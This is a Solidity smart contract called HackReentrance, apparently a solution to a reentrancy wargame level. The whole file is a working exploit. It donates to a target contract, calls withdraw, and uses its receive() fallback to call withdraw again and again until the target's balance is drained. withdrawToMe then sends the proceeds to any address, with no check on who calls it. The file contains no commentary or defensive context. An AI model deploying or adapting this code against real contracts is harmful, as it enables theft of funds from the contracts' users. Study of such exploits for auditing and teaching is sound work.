// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract HackReentrance {
    IReentrance reentranceInst;
    address reentrance; 

    constructor(address _reentrance) {
        reentranceInst = IReentrance(_reentrance);
        reentrance = _reentrance;
    }

    function myDonate() public payable {
        (bool success, ) = reentrance.call{value: msg.value}(
            abi.encodeWithSignature("donate(address)", address(this))
        );   
        require(success, "Failed to send value!");
    }

    function initialWithdraw(uint amount) public {
        reentranceInst.withdraw(amount);
    }

    receive() external payable {
        if (reentrance.balance >= msg.value) {
            reentranceInst.withdraw(msg.value);
        }
    }

    function withdrawToMe(address payable _me) public {
        _me.transfer(address(this).balance);
    }
}

interface IReentrance {
  function withdraw(uint _amount) external;
}